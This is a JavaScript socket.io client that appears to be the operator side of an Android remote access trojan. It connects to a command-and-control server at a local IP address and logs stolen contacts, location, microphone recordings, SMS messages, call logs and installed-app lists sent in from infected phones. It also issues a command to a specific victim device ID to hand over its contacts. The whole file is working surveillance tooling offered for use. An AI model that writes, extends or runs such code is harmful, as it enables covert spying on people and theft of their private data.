const io = require('socket.io-client');

// Connect to server
const socket = io('http://192.168.1.101:9400');

socket.on('connect', () => {
    console.log('✅ Connected to server');
    
    // Listen for data from clients
    socket.on('0xCO', (data) => {
        console.log('📱 Received contacts data:', JSON.stringify(data, null, 2));
    });
    
    socket.on('0xLO', (data) => {
        console.log('📍 Received location data:', JSON.stringify(data, null, 2));
    });
    
    socket.on('0xMI', (data) => {
        console.log('🎤 Received microphone data:', JSON.stringify(data, null, 2));
    });
    
    socket.on('0xSM', (data) => {
        console.log('💬 Received SMS data:', JSON.stringify(data, null, 2));
    });
    
    socket.on('0xCL', (data) => {
        console.log('📞 Received call log data:', JSON.stringify(data, null, 2));
    });
    
    socket.on('0xIN', (data) => {
        console.log('📱 Received installed apps data:', JSON.stringify(data, null, 2));
    });
    
    // Wait a bit then send a test command
    setTimeout(() => {
        console.log('📤 Sending test command...');
        
        socket.emit('send_command', {
            clientID: 'android_1758306345283_994', // Use the client ID from logs
            command: {
                type: '0xCO', // Contacts command
                uid: 'test_' + Date.now()
            }
        });
        
        console.log('✅ Command sent successfully');
    }, 2000);
});

socket.on('disconnect', () => {
    console.log('❌ Disconnected from server');
});

socket.on('error', (error) => {
    console.error('❌ Socket error:', error);
});

// Keep alive
setInterval(() => {
    if (socket.connected) {
        console.log('💓 Connection alive');
    } else {
        console.log('💔 Connection lost');
    }
}, 10000);
